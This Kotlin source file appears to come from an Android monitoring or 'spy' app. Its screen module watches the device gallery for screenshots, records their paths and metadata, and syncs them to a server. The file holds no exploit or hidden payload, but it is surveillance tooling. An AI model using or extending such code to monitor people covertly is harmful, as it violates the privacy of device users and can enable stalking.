package com.myspy.android.modules.screen

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.database.ContentObserver
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.provider.MediaStore
import android.util.Log
import androidx.core.content.ContextCompat
import com.myspy.android.data.local.db.entities.ScreenshotEntity
import com.myspy.android.data.repository.ScreenshotRepository
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

/**
 * Screen Monitoring Module
 * Monitors screenshots taken on the device
 *
 * Note: This monitors screenshots in the MediaStore, which requires storage permissions.
 * For full screen capture capability, MediaProjection API would be needed with user consent.
 *
 * @author Michael KOJDL
 * @version 1.0.0
 */
class ScreenModule(
    private val context: Context,
    private val repository: ScreenshotRepository,
    private val scope: CoroutineScope
) {
    companion object {
        private const val TAG = "ScreenModule"

        private val REQUIRED_PERMISSIONS = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            arrayOf(Manifest.permission.READ_MEDIA_IMAGES)
        } else {
            arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE)
        }

        // Common screenshot folder paths
        private val SCREENSHOT_PATHS = arrayOf(
            "screenshot",
            "screenshots",
            "screencapture",
            "screen capture"
        )
    }

    private var contentObserver: ContentObserver? = null
    private var isRunning = false
    private var lastProcessedTime = 0L

    /**
     * Check if all required permissions are granted
     */
    fun hasPermissions(): Boolean {
        return REQUIRED_PERMISSIONS.all { permission ->
            ContextCompat.checkSelfPermission(context, permission) == PackageManager.PERMISSION_GRANTED
        }
    }

    /**
     * Start monitoring screenshots
     */
    fun start() {
        if (!hasPermissions()) {
            Log.w(TAG, "Missing permissions for screen monitoring")
            return
        }

        if (isRunning) {
            Log.d(TAG, "ScreenModule already running")
            return
        }

        Log.i(TAG, "Starting ScreenModule")
        isRunning = true

        // Collect recent screenshots
        collectRecentScreenshots()

        // Register content observer for new screenshots
        registerContentObserver()
    }

    /**
     * Stop monitoring screenshots
     */
    fun stop() {
        if (!isRunning) return

        Log.i(TAG, "Stopping ScreenModule")
        isRunning = false

        contentObserver?.let {
            context.contentResolver.unregisterContentObserver(it)
        }
        contentObserver = null
    }

    /**
     * Sync collected data to server
     */
    suspend fun syncData(): Result<Int> {
        if (!hasPermissions()) {
            return Result.failure(Exception("Missing permissions"))
        }

        Log.d(TAG, "Syncing screenshots to server")
        return repository.syncToServer()
    }

    /**
     * Get count of unsynced screenshots
     */
    suspend fun getUnsyncedCount(): Int {
        return repository.getUnsyncedCount()
    }

    /**
     * Collect recent screenshots from MediaStore
     */
    private fun collectRecentScreenshots() {
        scope.launch(Dispatchers.IO) {
            try {
                Log.d(TAG, "Collecting recent screenshots")
                val screenshotsList = mutableListOf<ScreenshotEntity>()

                val projection = arrayOf(
                    MediaStore.Images.Media._ID,
                    MediaStore.Images.Media.DISPLAY_NAME,
                    MediaStore.Images.Media.DATA,
                    MediaStore.Images.Media.SIZE,
                    MediaStore.Images.Media.WIDTH,
                    MediaStore.Images.Media.HEIGHT,
                    MediaStore.Images.Media.DATE_TAKEN
                )

                // Build selection to filter screenshots by path
                val selection = buildScreenshotSelection()

                val cursor = context.contentResolver.query(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    projection,
                    selection,
                    null,
                    "${MediaStore.Images.Media.DATE_TAKEN} DESC LIMIT 50"
                )

                cursor?.use {
                    val idIndex = it.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
                    val nameIndex = it.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
                    val dataIndex = it.getColumnIndexOrThrow(MediaStore.Images.Media.DATA)
                    val sizeIndex = it.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE)
                    val widthIndex = it.getColumnIndexOrThrow(MediaStore.Images.Media.WIDTH)
                    val heightIndex = it.getColumnIndexOrThrow(MediaStore.Images.Media.HEIGHT)
                    val dateIndex = it.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_TAKEN)

                    while (it.moveToNext()) {
                        try {
                            val filePath = it.getString(dataIndex)

                            // Double-check it's a screenshot
                            if (!isScreenshotPath(filePath)) continue

                            val fileName = it.getString(nameIndex)
                            val fileSize = it.getLong(sizeIndex)
                            val width = it.getInt(widthIndex)
                            val height = it.getInt(heightIndex)
                            val timestamp = it.getLong(dateIndex)

                            // Only collect screenshots newer than last processed
                            if (timestamp <= lastProcessedTime) continue

                            screenshotsList.add(
                                ScreenshotEntity(
                                    filePath = filePath,
                                    fileName = fileName,
                                    fileSize = fileSize,
                                    width = width,
                                    height = height,
                                    timestamp = timestamp,
                                    synced = false
                                )
                            )

                            if (timestamp > lastProcessedTime) {
                                lastProcessedTime = timestamp
                            }
                        } catch (e: Exception) {
                            Log.w(TAG, "Error processing screenshot row", e)
                        }
                    }
                }

                if (screenshotsList.isNotEmpty()) {
                    repository.saveMultiple(screenshotsList)
                    Log.i(TAG, "Collected ${screenshotsList.size} screenshots")
                } else {
                    Log.d(TAG, "No new screenshots found")
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error collecting screenshots", e)
            }
        }
    }

    /**
     * Register ContentObserver for real-time screenshot detection
     */
    private fun registerContentObserver() {
        contentObserver = object : ContentObserver(Handler(Looper.getMainLooper())) {
            override fun onChange(selfChange: Boolean, uri: Uri?) {
                super.onChange(selfChange, uri)
                Log.d(TAG, "Media content changed, checking for new screenshots")
                // Small delay to ensure file is fully written
                Handler(Looper.getMainLooper()).postDelayed({
                    collectRecentScreenshots()
                }, 1000)
            }
        }

        context.contentResolver.registerContentObserver(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            true,
            contentObserver!!
        )

        Log.d(TAG, "ContentObserver registered for screenshots")
    }

    /**
     * Build SQL selection for screenshot paths
     */
    private fun buildScreenshotSelection(): String {
        val conditions = SCREENSHOT_PATHS.map { path ->
            "${MediaStore.Images.Media.DATA} LIKE '%/$path/%'"
        }
        return conditions.joinToString(" OR ")
    }

    /**
     * Check if file path is a screenshot
     */
    private fun isScreenshotPath(path: String): Boolean {
        val lowerPath = path.lowercase()
        return SCREENSHOT_PATHS.any { lowerPath.contains("/$it/") }
    }
}
